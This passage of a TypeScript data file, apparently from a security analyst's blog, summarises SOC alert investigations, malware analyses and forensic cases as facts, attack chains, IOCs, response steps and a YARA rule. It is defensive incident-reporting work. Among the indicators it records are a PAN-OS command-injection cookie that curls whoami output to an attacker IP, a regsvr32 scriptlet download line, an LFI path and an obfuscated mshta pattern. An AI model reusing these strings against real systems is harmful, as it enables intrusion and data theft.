/*
 * The structured half of a case page: facts, attack chain, timeline,
 * indicators, response and detections — copied from each case's PDF.
 * A case without an entry still renders (summary and evidence only).
 * SERVER-ONLY: read by app/blog/[slug]/page.tsx.
 */

export type IocType = "ip" | "domain" | "url" | "email" | "hash" | "file" | "registry" | "account" | "other";

export type CaseDetail = {
  /** One-line outcome: what the alert really was */
  verdict?: string;
  severity?: "Critical" | "High" | "Medium" | "Low";
  /** Key/value facts for the side box */
  facts?: readonly { label: string; value: string }[];
  /** The attack as a chain of steps, each optionally tagged with an ATT&CK id */
  chain?: readonly { step: string; technique?: string }[];
  timeline?: readonly { time: string; event: string }[];
  iocs?: readonly { type: IocType; value: string; note?: string }[];
  /** What was done (or recommended) to contain and fix it */
  response?: readonly string[];
  /** Detection content written in the report (YARA, Wazuh, Sigma, SPL …) */
  detection?: readonly { title: string; lang: string; code: string }[];
  /** Number of pages in the PDF — the read time is derived from it */
  pages?: number;
  /** Shown as a banner when the work was done as a team */
  team?: string;
  /** Extra documents that belong to the case */
  attachments?: readonly { label: string; href: string }[];
  /** "What I'd do differently" — written by the author */
  lessons?: string;
};

const LD = "LetsDefend SOC simulator";

export const caseDetails: Record<string, CaseDetail> = {
  /* ── LetsDefend SOC alerts ─────────────────────────────────────────── */
  "soc127-pdf": {
    verdict: "True positive — web attack allowed, server treated as potentially compromised",
    severity: "High",
    pages: 4,
    facts: [
      { label: "Platform", value: LD },
      { label: "Rule", value: "SOC127 – SQL Injection Detected" },
      { label: "Target", value: "WebServer1000 · 172.16.20.12" },
      { label: "Source", value: "118.194.247.28 (CN, AS4808) — 9/94 on VirusTotal" },
      { label: "Device action", value: "Allowed · HTTP 200" },
    ],
    chain: [
      { step: "Encoded GET request with several payloads at once", technique: "T1190" },
      { step: "UNION ALL SELECT against information_schema.tables" },
      { step: "<script>alert(\"XSS\")</script> in the same parameter" },
      { step: "xp_cmdshell trying to read /etc/passwd", technique: "T1059" },
    ],
    timeline: [{ time: "2024-03-07 12:51", event: "Alert raised; request allowed with HTTP 200" }],
    iocs: [
      { type: "ip", value: "118.194.247.28", note: "Attacker" },
      { type: "ip", value: "172.16.20.12", note: "Targeted web server" },
    ],
    response: [
      "Escalated to the IR team through case management",
      "Isolate WebServer1000 pending forensic review",
      "Block 118.194.247.28 on the perimeter firewall and WAF",
      "Vulnerability assessment and a fix for the input-validation flaw",
    ],
  },
  "soc205-pdf": {
    verdict: "True positive — macro executed and pulled a second-stage payload",
    severity: "Medium",
    pages: 7,
    facts: [
      { label: "Platform", value: LD },
      { label: "Rule", value: "SOC205 – Malicious Macro has been executed" },
      { label: "Host", value: "Jayne · 172.16.17.198" },
      { label: "Document", value: "edit1-invoice.docm — 26/56 on VirusTotal (TrojanDownloader)" },
    ],
    chain: [
      { step: "ZIP disguised as an invoice downloaded and extracted", technique: "T1566.001" },
      { step: "User opens edit1-invoice.docm and enables macros", technique: "T1204.002" },
      { step: "Macro fires when an InkEdit control gets focus", technique: "T1059.005" },
      { step: "WINWORD.EXE spawns PowerShell (Event ID 4688)", technique: "T1059.001" },
      { step: "WebClient.DownloadFile fetches messbox.exe", technique: "T1105" },
    ],
    timeline: [
      { time: "2024-02-28 08:41", event: "edit1-invoice.docm extracted from the ZIP" },
      { time: "2024-02-28 08:42", event: "powershell.exe resolves www.greyhathacker.net (Sysmon Event ID 22); alert raised" },
    ],
    iocs: [
      { type: "hash", value: "1a819d18c9a9de4f81829c4cd55a17f767443c22f9b30ca953866827e5d96fb0", note: "edit1-invoice.docm (SHA-256)" },
      { type: "url", value: "http://www.greyhathacker.net/tools/messbox.exe", note: "Second-stage download" },
      { type: "domain", value: "www.greyhathacker.net" },
      { type: "file", value: "edit1-invoice.docm.zip" },
    ],
    response: [
      "Escalated to IR for host isolation and forensic review",
      "Isolate Jayne through endpoint security before mess.exe can reach C2",
      "Block greyhathacker.net and its IPs on firewalls and proxies",
      "Blacklist the document and payload hashes in the EDR",
    ],
  },
  "soc257-pdf": {
    verdict: "True positive — VPN account compromised, likely by brute force",
    severity: "Low",
    pages: 5,
    facts: [
      { label: "Platform", value: LD },
      { label: "Rule", value: "SOC257 – VPN Connection Detected from Unauthorized Country" },
      { label: "Account", value: "monica@letsdefend.io" },
      { label: "VPN gateway", value: "33.33.33.33 · vpn-letsdefend.io" },
      { label: "Threat intel", value: "Source IP flagged by AbuseCH for brute force (2023-12-07)" },
    ],
    chain: [
      { step: "21 connection attempts to the gateway on many ports", technique: "T1110" },
      { step: "Successful VPN login with Monica's credentials", technique: "T1133" },
      { step: "Session from an unauthorized country", technique: "T1078" },
    ],
    timeline: [
      { time: "2024-02-13 01:50–01:58", event: "21 firewall events from 113.161.158.12 to the gateway" },
      { time: "2024-02-13", event: "VPN session established as monica@letsdefend.io; alert raised" },
    ],
    iocs: [
      { type: "ip", value: "113.161.158.12", note: "Attacker" },
      { type: "account", value: "monica@letsdefend.io", note: "Compromised account" },
    ],
    response: [
      "Terminated the active VPN session",
      "Disabled the AD/VPN account pending a password reset and an MFA review",
      "Blocked 113.161.158.12 on the external firewall",
    ],
  },
  "soc274-pdf": {
    verdict: "True positive — root-level code execution on the firewall",
    severity: "Critical",
    pages: 2,
    facts: [
      { label: "Platform", value: LD },
      { label: "Rule", value: "SOC274 – PAN-OS Command Injection Exploitation (CVE-2024-3400)" },
      { label: "Target", value: "PA-Firewall-01 · 172.16.17.139" },
      { label: "CVE", value: "CVE-2024-3400 · CVSS 10.0" },
      { label: "Device action", value: "Allowed" },
    ],
    chain: [
      { step: "POST to /global-protect/login.esp", technique: "T1190" },
      { step: "Path traversal in the SESSID cookie into the telemetry directory" },
      { step: "Injected curl sends the output of whoami to the attacker", technique: "T1059.004" },
      { step: "Firewall connects out to 144.172.79.92:4444" },
    ],
    timeline: [
      { time: "2024-04-18 14:15", event: "Threat intel flags 144.172.79.92 as malicious" },
      { time: "2024-04-18 15:09", event: "Exploit request reaches the firewall; alert raised" },
      { time: "2024-04-18 15:09:42", event: "Outbound connection from the firewall to the attacker" },
    ],
    iocs: [
      { type: "ip", value: "144.172.79.92", note: "Attacker / callback" },
      { type: "other", value: "SESSID=../../../../opt/panlogs/tmp/device_telemetry/hour/aaa`curl${IFS}144.172.79.92:4444?user=$(whoami)`", note: "Exploit cookie" },
    ],
    response: [
      "Escalated to IR and network security",
      "Isolate PA-Firewall-01 to stop a pivot into the internal network",
      "Block 144.172.79.92 inbound and outbound on every perimeter control",
      "Suspend GlobalProtect until the device is patched",
    ],
  },
  "soc282-pdf": {
    verdict: "True positive — payload executed and ran host enumeration",
    severity: "Medium",
    pages: 5,
    facts: [
      { label: "Platform", value: LD },
      { label: "Rule", value: "SOC282 – Phishing Alert Deceptive Mail Detected" },
      { label: "Host", value: "Felix · 172.16.20.151" },
      { label: "Lure", value: "\"Free Coffee Voucher\" from a typosquatted domain" },
    ],
    chain: [
      { step: "Mail with free-coffee.zip and its password in the body", technique: "T1566.001" },
      { step: "User downloads the ZIP from an S3 URL", technique: "T1204.002" },
      { step: "cmd.exe runs systeminfo and wmic logicaldisk", technique: "T1082" },
      { step: "tasklist /svc", technique: "T1057" },
      { step: "ipconfig /all and route print", technique: "T1016" },
    ],
    timeline: [
      { time: "2024-05-13 09:22", event: "Alert raised on the phishing e-mail" },
      { time: "2024-05-13 12:59", event: "free-coffee.zip opened from an AWS S3 URL" },
      { time: "2024-05-13 13:01", event: "Enumeration commands start in cmd.exe" },
    ],
    iocs: [
      { type: "email", value: "free@coffeeshooop.com", note: "Sender" },
      { type: "domain", value: "coffeeshooop.com", note: "Typosquatted" },
      { type: "ip", value: "103.80.134.63", note: "Mail source, flagged for phishing" },
      { type: "file", value: "free-coffee.zip", note: "Password: infected" },
    ],
    response: [
      "Isolate Felix's workstation",
      "Delete the mail and search Exchange for other recipients",
      "Block coffeeshooop.com and 103.80.134.63 on the mail gateway and firewalls",
      "Suspend Felix's AD account and force a password reset",
    ],
  },
  "soc326-report": {
    verdict: "True positive — user clicked and the host reached the phishing server",
    severity: "Medium",
    pages: 9,
    facts: [
      { label: "Platform", value: LD },
      { label: "Detection", value: "SIEM alert on a proxy connection to letsdefwnd.io" },
      { label: "Host", value: "Mateo · 172.16.17.162" },
      { label: "Lure", value: "Voucher e-mail from a typosquatted domain" },
    ],
    chain: [
      { step: "Phishing e-mail from voucher@letsdefwnd.io", technique: "T1566.002" },
      { step: "User clicks https://letsdefwnd.io", technique: "T1204.001" },
      { step: "chrome.exe connects to 45.33.23.183:443 (allowed)" },
    ],
    timeline: [{ time: "2024-09-18 13:32", event: "Proxy and endpoint logs show the connection; alert raised" }],
    iocs: [
      { type: "email", value: "voucher@letsdefwnd.io", note: "Sender" },
      { type: "domain", value: "letsdefwnd.io", note: "Typosquat of letsdefend.io" },
      { type: "ip", value: "45.33.23.183" },
    ],
    response: [
      "Contained the host through endpoint security (network isolation)",
      "Blocked the IP and domain on the firewall and proxy",
      "Suspended network access and recommended a credential reset",
    ],
  },
  "soc336-report": {
    verdict: "True positive — zero-click RCE, host compromised",
    severity: "Critical",
    pages: 9,
    facts: [
      { label: "Platform", value: LD },
      { label: "Rule", value: "SOC336 – Windows OLE ZeroClick RCE Exploitation Detected" },
      { label: "Host", value: "Austin · 172.16.17.137" },
      { label: "CVE", value: "CVE-2025-21298 · CVSS 9.8" },
      { label: "Status", value: "Host contained" },
    ],
    chain: [
      { step: "\"Important: Action Required…\" e-mail with mail.rtf, allowed", technique: "T1566.001" },
      { step: "Outlook renders the RTF — OLE zero-click", technique: "T1203" },
      { step: "OUTLOOK.EXE spawns cmd.exe", technique: "T1059.003" },
      { step: "regsvr32 /s /u /i:…/shell.sct scrobj.dll", technique: "T1218.010" },
      { step: "shell.sct downloaded through the proxy (permitted)", technique: "T1105" },
    ],
    timeline: [
      { time: "2025-02-04 08:06:08", event: "OUTLOOK.EXE spawns cmd.exe running regsvr32" },
      { time: "2025-02-04 16:18", event: "Critical alert raised" },
    ],
    iocs: [
      { type: "email", value: "projectmanagement@pm.me", note: "Sender" },
      { type: "hash", value: "df993d037cdb77a435d6993a37e7750dbbb16b2df64916499845b56aa9194184", note: "mail.rtf (SHA-256)" },
      { type: "ip", value: "84.38.130.118", note: "Payload server" },
      { type: "url", value: "http://84.38.130.118.com/shell.sct", note: "As written in the command line" },
    ],
    response: [
      "Host isolated (\"Host Contained\" in endpoint security)",
      "Escalated to the IR team through case management",
      "Block 84.38.130.118 and the sender on firewall and proxy",
      "Blacklist the RTF hash in the EDR",
    ],
  },
  "soc338-pdf": {
    verdict: "True positive — fileless chain linked to Lumma Stealer",
    severity: "High",
    pages: 6,
    facts: [
      { label: "Platform", value: LD },
      { label: "Host", value: "Dylan · 172.16.17.216" },
      { label: "Lure", value: "\"Upgrade your system to Windows 11 Pro for FREE\"" },
      { label: "Threat intel", value: "132.232.40.201 tagged Lumma / Lumma Stealer" },
    ],
    chain: [
      { step: "Phishing e-mail from update@windows-update.site", technique: "T1566.002" },
      { step: "User opens the fake Windows update site", technique: "T1204.004" },
      { step: "Obfuscated PowerShell behind a fake reCAPTCHA comment", technique: "T1059.001" },
      { step: "String replacement hides the command", technique: "T1027" },
      { step: "mshta.exe fetches the next stage", technique: "T1218.005" },
    ],
    timeline: [
      { time: "2025-03-13 09:44", event: "Phishing e-mail delivered (allowed by Exchange)" },
      { time: "2025-03-13 23:26:08", event: "Browser visits windows-update.site" },
      { time: "2025-03-13 23:26:19", event: "Obfuscated PowerShell runs and launches mshta.exe" },
    ],
    iocs: [
      { type: "email", value: "update@windows-update.site", note: "Sender" },
      { type: "ip", value: "132.232.40.201", note: "Sender / site, Lumma Stealer" },
      { type: "domain", value: "windows-update.site", note: "Fake update site" },
      { type: "url", value: "https://overcoatpassably.shop/Z8UZbPyVpGfdRS/maloy.mp4", note: "Next-stage payload" },
      { type: "other", value: "('ms]]]ht]]]a]]].]]]exe' -replace ']')", note: "Obfuscation pattern" },
    ],
    response: [
      "Activate host containment for Dylan's workstation",
      "Blocked the IP and both domains on firewalls and web proxies",
      "Forced a password reset and session revocation across AD and cloud services",
    ],
  },
  "soc342-pdf": {
    verdict: "True positive — server compromised with a persistent web shell",
    severity: "Critical",
    pages: 7,
    facts: [
      { label: "Platform", value: LD },
      { label: "Rule", value: "SOC342 – CVE-2025-53770 SharePoint ToolShell Auth Bypass and RCE" },
      { label: "Target", value: "SharePoint01 · 172.16.20.17" },
      { label: "CVE", value: "CVE-2025-53770" },
      { label: "Web shell", value: "spinstall0.aspx — 41/60 on VirusTotal" },
    ],
    chain: [
      { step: "Unauthenticated POST to /_layouts/15/ToolPane.aspx", technique: "T1190" },
      { step: "Encoded PowerShell as IIS APPPOOL\\SharePoint - 80", technique: "T1059.001" },
      { step: "cmd.exe writes spinstall0.aspx into LAYOUTS", technique: "T1505.003" },
      { step: "Server connects back to 107.191.58.76", technique: "T1071.001" },
    ],
    timeline: [
      { time: "2025-07-22 13:07", event: "Exploit request allowed; critical alert raised" },
      { time: "2025-07-22 13:08:04", event: "Outbound connection from SharePoint01 to the attacker" },
    ],
    iocs: [
      { type: "ip", value: "107.191.58.76", note: "Attacker / C2" },
      { type: "hash", value: "92bb4ddb98eeaf11fc15bb32e71d0a63256a0ed826a03ba293ce3a8bf057a514", note: "spinstall0.aspx (SHA-256)" },
      { type: "file", value: "C:\\Program Files\\Common Files\\Microsoft Shared\\Web Server Extensions\\16\\TEMPLATE\\LAYOUTS\\spinstall0.aspx" },
    ],
    response: [
      "Isolate SharePoint01 to cut the C2 session and lateral movement",
      "Block 107.191.58.76 on all perimeter firewalls and WAFs",
      "Suspend SharePoint services pending forensic imaging and a rebuild",
    ],
  },

  /* ── LetsDefend challenges ─────────────────────────────────────────── */
  "hidden-backdoor-report": {
    verdict: "Confirmed — Bitsloth stager downloaded and executed",
    severity: "High",
    pages: 18,
    facts: [
      { label: "Platform", value: "LetsDefend challenge" },
      { label: "Classification", value: "Drive-by compromise, trojan/backdoor (Bitsloth)" },
      { label: "Evidence", value: "Chrome History (SQLite), Prefetch" },
    ],
    chain: [
      { step: "User visits compromised site globalnewshub.com", technique: "T1189" },
      { step: "Silent download of notion-setup.exe from 18.199.176.247:1337" },
      { step: "Payload executes (Prefetch entry)", technique: "T1204.002" },
      { step: "Stager reaches for a second stage at a fake Microsoft URL", technique: "T1071.001" },
      { step: "Writes BITEA82.tmp to %TEMP%" },
    ],
    iocs: [
      { type: "domain", value: "globalnewshub.com", note: "Compromised site" },
      { type: "url", value: "http://18.199.176.247:1337/notion-setup.exe", note: "First-stage delivery" },
      { type: "url", value: "http://updater.microsoft.com/index.aspx", note: "Deceptive C2 URL" },
      { type: "hash", value: "DFB76BCF5A3E29225559EBBDAE8BDD24F69262492ECA2F99F7A9525628006D88", note: "notion-setup.exe (SHA-256)" },
      { type: "file", value: "C:\\Users\\a1l4m\\AppData\\Local\\Temp\\BITEA82.tmp" },
      { type: "file", value: "NOTION-SETUP.EXE-BEE97775.pf", note: "Prefetch — proof of execution" },
    ],
  },
  "serpent-stealer": {
    verdict: "Confirmed — .NET infostealer with sandbox evasion and UAC bypass",
    severity: "High",
    pages: 11,
    facts: [
      { label: "Platform", value: "LetsDefend challenge" },
      { label: "Type", value: "Information stealer · .NET PE32" },
      { label: "Compile time", value: "Forged (2042)" },
      { label: "Tools", value: "PowerShell, PEStudio, VirusTotal, dotPeek" },
    ],
    chain: [
      { step: "Checks the username against sandbox names (Evasion.AntiVT)", technique: "T1497" },
      { step: "Watches for analysis tools such as Process Hacker", technique: "T1057" },
      { step: "UAC bypass through the ms-settings registry hijack", technique: "T1548.002" },
      { step: "Steals FTP credentials from the registry", technique: "T1552.002" },
      { step: "Collects 21 file types and crypto wallets into %TEMP%\\serpent", technique: "T1074.001" },
    ],
    iocs: [
      { type: "hash", value: "A83230DDCED4AE435220D8756CC07BE9", note: "MD5" },
      { type: "hash", value: "C4F981F1F532EC827032775C88A45F1B4153C3D27885F189654AD6EE85C709C1", note: "SHA-256" },
      { type: "file", value: "C:\\Users\\%USERNAME%\\AppData\\Local\\Temp\\serpent", note: "Staging directory" },
      { type: "registry", value: "HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command", note: "UAC bypass" },
      { type: "registry", value: "HKCU\\Software\\Microsoft\\FTP", note: "Targeted credentials" },
    ],
    response: [
      "Isolate the host to cut C2 and stop exfiltration",
      "Reset all passwords, FTP and browser-stored credentials first",
      "Move funds out of local crypto wallets",
      "Load the hashes and registry IOCs into the EDR/XDR",
    ],
  },
  "imagestegano": {
    verdict: "Confirmed — Mimikatz variant hidden in PNG pixels",
    severity: "High",
    pages: 13,
    facts: [
      { label: "Platform", value: "LetsDefend challenge" },
      { label: "Artifact", value: "Im493.zip → Sd6wF1A1v.png (64,849 KB)" },
      { label: "Technique", value: "LSB steganography with Invoke-PSImage" },
    ],
    chain: [
      { step: "Oversized PNG suggests embedded data" },
      { step: "Metadata review with exiftool" },
      { step: "PowerShell encoded in pixel LSBs (Invoke-PSImage)", technique: "T1027.003" },
      { step: "Recovered script is obfuscated Mimikatz", technique: "T1003" },
    ],
    iocs: [
      { type: "file", value: "Im493.zip" },
      { type: "file", value: "Sd6wF1A1v.png", note: "Carrier image" },
    ],
  },
  "email-analysis-room-report": {
    verdict: "Malicious — trojan attachment (Loki/AgentTesla)",
    severity: "Medium",
    pages: 7,
    facts: [
      { label: "Platform", value: "LetsDefend challenge" },
      { label: "Subject", value: "united scientific equipment" },
      { label: "Recipient", value: "admin@malware-traffic-analysis.net" },
    ],
    chain: [
      { step: "E-mail from yanting@united.com.sg", technique: "T1566.001" },
      { step: "Executable attachment disguised as an invoice", technique: "T1204.002" },
    ],
    iocs: [
      { type: "email", value: "yanting@united.com.sg", note: "Sender" },
      { type: "ip", value: "71.19.248.52", note: "Origin (Canada)" },
      { type: "file", value: "united scientific equipent.exe" },
      { type: "hash", value: "9909753bfb0ac8ab165bab3555233d03b01a9274a92e57c022f87ccbe51ca415", note: "SHA-256" },
    ],
    response: [
      "Block 71.19.248.52 and the sender domain on the e-mail gateway",
      "Blacklist the hash in the EDR/antivirus",
    ],
  },
  "bruteforce-room-report": {
    verdict: "Two accounts compromised (web and SSH)",
    severity: "High",
    pages: 11,
    facts: [
      { label: "Platform", value: "LetsDefend challenge" },
      { label: "Server", value: "51.116.96.181 — HTTP, RDP, SSH" },
      { label: "Evidence", value: "auth.log and a PCAP" },
    ],
    chain: [
      { step: "HTTP brute force on index.php succeeds (web-hacker)", technique: "T1110.001" },
      { step: "Seven accounts tried over RDP from t3m0-virtual-ma", technique: "T1110" },
      { step: "7,480 failed SSH logins, then mmox logs in", technique: "T1078" },
    ],
    timeline: [{ time: "2024-02-25 11:43:54", event: "Successful SSH login as mmox after the brute force" }],
    iocs: [
      { type: "account", value: "web-hacker", note: "Compromised (web)" },
      { type: "account", value: "mmox", note: "Compromised (SSH)" },
      { type: "other", value: "t3m0-virtual-ma", note: "RDP client name" },
    ],
    response: [
      "Isolate the server and block the attacking IPs",
      "Suspend web-hacker and mmox and reset their passwords",
      "Add account lockout and rate limiting",
    ],
  },
  "malicious-web-traffic-room-report": {
    verdict: "Compromised — admin access and file disclosure",
    severity: "Critical",
    pages: 14,
    facts: [
      { label: "Platform", value: "LetsDefend challenge" },
      { label: "Attacker", value: "197.32.212.121" },
      { label: "Target", value: "10.1.0.4" },
      { label: "Tools", value: "Wireshark, CyberChef" },
    ],
    chain: [
      { step: "XXE with php://filter on /register/register.php", technique: "T1190" },
      { step: "Base64 source code leaks the admin user" },
      { step: "Login brute-forced — 302 to the dashboard", technique: "T1110" },
      { step: "LFI on view.php?file= reads /etc/passwd", technique: "T1083" },
      { step: "Open redirect on redirect.php?url=" },
    ],
    iocs: [
      { type: "ip", value: "197.32.212.121", note: "Attacker" },
      { type: "other", value: "/register/register.php", note: "XXE endpoint" },
      { type: "other", value: "../../../../etc/passwd", note: "LFI payload" },
    ],
    response: [
      "Disable external XML entities and validate input",
      "Remove hard-coded secrets and comments",
      "Rate limiting and a strong password policy",
      "Sanitize file paths and validate redirect targets",
    ],
  },

  /* ── Malware analysis ──────────────────────────────────────────────── */
  "malware-analysis-wannacry": {
    verdict: "Ransomware — modified WannaCry, delivered manually",
    severity: "Critical",
    pages: 45,
    facts: [
      { label: "Sample", value: "PE32+ GUI, x86-64 · 2.10 MB · not packed (entropy 2.91)" },
      { label: "Compiler", value: "MSVC 14.44" },
      { label: "Ransom", value: "USD 300 via a QQ e-mail address" },
      { label: "Not observed", value: "Kill-switch query, SMB/EternalBlue propagation" },
      { label: "Lab", value: "Isolated VMware Workstation" },
    ],
    chain: [
      { step: "Executed by hand on the host", technique: "T1204.002" },
      { step: "Files encrypted with the Windows CryptoAPI", technique: "T1486" },
      { step: "@WanaDecryptor@.exe shows the note and timer" },
      { step: "Wallpaper replaced via SystemParametersInfoW", technique: "T1491.001" },
      { step: "ICO5452.tmp dropped in %TEMP%" },
    ],
    iocs: [
      { type: "hash", value: "70920f342814ca5c662cbbed00d60eef", note: "MD5" },
      { type: "hash", value: "3e96e1f6a2d7cc6b72473d141e1962260325a0e7", note: "SHA-1" },
      { type: "hash", value: "b547dc7a77af8022abbf19a7006213342444caea1cede20ea2409ce9bc9790bf", note: "SHA-256" },
      { type: "email", value: "3905960807@qq.com", note: "Ransom contact" },
      { type: "file", value: "@WanaDecryptor@.exe" },
      { type: "file", value: "%LOCALAPPDATA%\\Temp\\ICO5452.tmp" },
    ],
    detection: [
      {
        title: "YARA — high-confidence variant rule (rule 1 of 3)",
        lang: "yara",
        code: `rule WannaCry_Modified_QQ_Variant
{
    meta:
        author      = "Ahmed Emad Nasr"
        description = "Detects modified WannaCry variant with QQ-based ransom comms"
        date        = "2026-04-13"
        hash_sha256 = "b547dc7a77af8022abbf19a7006213342444caea1cede20ea2409ce9bc9790bf"
        severity    = "high"
    strings:
        $s1   = "@WanaDecryptor@"      ascii wide
        $s2   = "3905960807@qq.com"    ascii wide
        $s3   = "Forever_AES_KEY"      ascii
        $s4   = "ICO5452.tmp"          ascii
        $api1 = "CryptEncrypt"         ascii
        $api2 = "CryptAcquireContextW" ascii
        $api3 = "CryptCreateHash"      ascii
    condition:
        uint16(0) == 0x5A4D and (2 of ($s*)) and (2 of ($api*))
}`,
      },
    ],
    attachments: [{ label: "Malware analysis playbook (1 page)", href: "Assets/Cases/Malware Analysis and Prevention Strategy/AhmedEmad_Playbook.pdf" }],
  },
  "depi-r4-project": {
    verdict: "Ransomware analysis plus a Wazuh-based prevention plan",
    pages: 58,
    facts: [
      { label: "Programme", value: "Digital Egypt Pioneers Initiative, Round 4" },
      { label: "Sample", value: "Modified WannaCry (SHA-256 b547dc7a…790bf)" },
      { label: "Prevention", value: "Wazuh manager, indexer, Filebeat and dashboard" },
    ],
    attachments: [{ label: "Video walkthrough (YouTube playlist)", href: "https://youtube.com/playlist?list=PLO1VSSKnwZUgGaiDZXU-mKuh8CUZxgAd" }],
  },
  "malware2-report": {
    verdict: "Malicious loader hiding a stage-two payload in its overlay",
    severity: "High",
    pages: 10,
    facts: [
      { label: "Sample", value: "singlefilehost.exe (PDF icon)" },
      { label: "Signature", value: "Expired Microsoft Code Signing PCA 2010" },
      { label: "Overlay", value: "87.52% of the file" },
      { label: "Tools", value: "PEStudio, HxD" },
    ],
    chain: [
      { step: "Executable masquerades as a PDF", technique: "T1036" },
      { step: "Payload appended in the overlay, MZ pushed down by null bytes", technique: "T1027" },
      { step: "Overlay dumped and padding removed to rebuild the PE" },
      { step: "Stage two: compile date forged to 2061", technique: "T1070.006" },
    ],
    iocs: [
      { type: "hash", value: "DCE2488DDC3AB45FE8DF1C2BB3E21CD11D4E697E94E0E2A88B4BFD35C6516055", note: "singlefilehost.exe (SHA-256)" },
      { type: "hash", value: "160D0260FD2DF7DA4381AB01E87D7C047D4A381C59D35FE1B60F0ABE162A915A", note: "Stage two (SHA-256)" },
      { type: "file", value: "tkfgk435jkdgf.dll", note: "Original filename" },
      { type: "other", value: "C:\\Users\\admin\\source\\repos\\SDCBundle\\SDCBundle\\obj\\Release\\net6.0-winx64\\tkfgk435jkdgf.pdb", note: "PDB path" },
    ],
  },
  "unload-malware-report": {
    verdict: "IcedID (BokBot) stage-one loader",
    severity: "High",
    pages: 13,
    facts: [
      { label: "Sample", value: "unload.dll · PE64 DLL · 16,320 bytes" },
      { label: "Original name", value: "loader_dll_64.dll" },
      { label: "Built", value: "2022-11-30 · Visual Studio 2017 (MSVC 19.12)" },
      { label: "Tools", value: "PEStudio, FLOSS, VirusTotal" },
    ],
    chain: [
      { step: "Run as rundll32.exe unload.dll,init", technique: "T1218.011" },
      { step: "Strings decoded at runtime; APIs resolved dynamically", technique: "T1027" },
      { step: "WinHTTP beacon to podiumstrtss.com", technique: "T1071.001" },
      { step: "Second stage downloaded and run in memory", technique: "T1105" },
    ],
    iocs: [
      { type: "hash", value: "A3FA68045D0106D6DB3D43DF6B5997D9034F9F7D2A34148187498E4B504EBF58", note: "SHA-256" },
      { type: "domain", value: "podiumstrtss.com", note: "C2 — 14/95 vendors" },
      { type: "other", value: "rundll32.exe unload.dll,init", note: "Execution" },
    ],
  },

  /* ── Forensics ─────────────────────────────────────────────────────── */
  "data-exfiltration-investigation": {
    verdict: "Confirmed exfiltration to USB, then credential theft",
    severity: "High",
    pages: 27,
    facts: [
      { label: "Case", value: "INC-2026-04-27" },
      { label: "Image", value: "memdumpWin7.mem · Win7SP1x86_23418" },
      { label: "Host / user", value: "IE8WIN7 · IEUser" },
      { label: "Tools", value: "Volatility 2.6.1, FTK Imager, John the Ripper" },
    ],
    chain: [
      { step: "User browses to Downloads (shellbags)" },
      { step: "copy secret_file.docx F: — 1 file(s) copied", technique: "T1052.001" },
      { step: "Local NTLM hashes dumped", technique: "T1003.002" },
      { step: "Hashes cracked offline with John the Ripper", technique: "T1110.002" },
      { step: "sshd listening on port 22 — possible backdoor" },
    ],
    timeline: [
      { time: "2019-01-06 14:49:40", event: "IEUser opens C:\\Users\\IEUser\\Downloads (shellbags)" },
      { time: "2019-01-06 15:02:49", event: "sshd.exe (PID 2016) listening on port 22 (netscan)" },
      { time: "2019-01-06 15:06:11", event: "cmd.exe (PID 3996) started from explorer.exe (pslist)" },
      { time: "After 15:06:11", event: "secret_file.docx copied to F:; NTLM hashes extracted; John the Ripper run" },
      { time: "2019-01-06 15:07:15", event: "FTK Imager starts the memory acquisition" },
    ],
    iocs: [
      { type: "file", value: "secret_file.docx", note: "Exfiltrated document" },
      { type: "other", value: "Ven_General&Prod_UDisk", note: "USB device mounted as F:" },
    ],
  },
  "usb-forensics-report": {
    verdict: "Deliberate insider access to payroll PII from a USB drive",
    severity: "High",
    pages: 12,
    facts: [
      { label: "Reference", value: "INCD-2024-07-USB-LEAK" },
      { label: "Evidence", value: "Payroll_leak_investigation triage set (offline)" },
      { label: "Tools", value: "Registry Explorer, ShellBags Explorer, JumpList Explorer" },
      { label: "USB serial", value: "5639311262174133917 · drive E:" },
    ],
    timeline: [
      { time: "2024-07-15 03:36:22", event: "USB device first connected (USBSTOR)" },
      { time: "2024-07-15 03:37:28", event: "User opens the USB root (ShellBags)" },
      { time: "2024-07-15 03:37:54", event: "User moves through the staging folders" },
      { time: "2024-07-15 03:38:07", event: "Employee_PII.csv opened in Notepad (JumpList)" },
    ],
    iocs: [
      { type: "file", value: "E:\\NewProject_Hires_Data\\Payroll_NewHires\\Payroll_NewHires\\Payroll_data1\\Employee_PII.csv" },
      { type: "other", value: "5639311262174133917", note: "USB serial number" },
    ],
    response: [
      "DLP to stop sensitive data reaching removable media",
      "Disable USB mass storage by default; allow-list by VID, PID and serial",
      "EDR detections for sensitive-file access and removable-media use",
      "UEBA for insider-threat patterns",
    ],
  },
  "lockbit-ransomware-forensics": {
    verdict: "LockBit infection confirmed from memory",
    severity: "Critical",
    pages: 12,
    facts: [
      { label: "Image", value: "Lockbit.vmem · Win7SP1x64" },
      { label: "Process", value: "mal.exe · PID 900 · C:\\Users\\Josh\\Desktop" },
      { label: "Detection", value: "61/71 on VirusTotal" },
      { label: "Tools", value: "Volatility 2.6.1, VirusTotal, Hybrid Analysis" },
    ],
    chain: [
      { step: "mal.exe runs from the Desktop", technique: "T1204.002" },
      { step: "Run-key value XO1XADpO01 for persistence", technique: "T1547.001" },
      { step: "Privilege escalation reported as T1543 by the sandbox", technique: "T1543" },
      { step: "Files encrypted with the .lockbit extension", technique: "T1486" },
    ],
    timeline: [{ time: "2023-04-13 10:06:45 UTC", event: "mal.exe (PID 900) created" }],
    iocs: [
      { type: "hash", value: "19ca5aa4cd62929afb255d2b38e70fd3143e3b181889e84348a5c896e577d708", note: "Extracted payload (SHA-256)" },
      { type: "hash", value: "67c6784a5296658ac4d633f4e8c0914ecc783b1cf2f6431818c4e2f3cdcce91f", note: "Ransom note (SHA-256)" },
      { type: "file", value: "C:\\Users\\Josh\\Desktop\\mal.exe" },
      { type: "registry", value: "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run → XO1XADpO01" },
    ],
  },
  "ecir-registry-forensics": {
    verdict: "Tip substantiated — unauthorized and trace-wiping software",
    pages: 25,
    facts: [
      { label: "Lab", value: "INE eCIR · Module 6, Lab 14" },
      { label: "Computer", value: "4ORENSICS · Windows 8.1 Enterprise (9600)" },
      { label: "User", value: "Hunter — Administrators group (RID 1001)" },
      { label: "Time zone", value: "Pacific (UTC-8, DST active)" },
      { label: "Installed", value: "2016-06-21 08:17:45 UTC" },
    ],
    chain: [
      { step: "Installs BCWipe and CCleaner", technique: "T1070.004" },
      { step: "Installs TeamViewer", technique: "T1219" },
      { step: "Installs Zenmap/Nmap", technique: "T1046" },
      { step: "Skype and Dropbox for personal use" },
    ],
    iocs: [
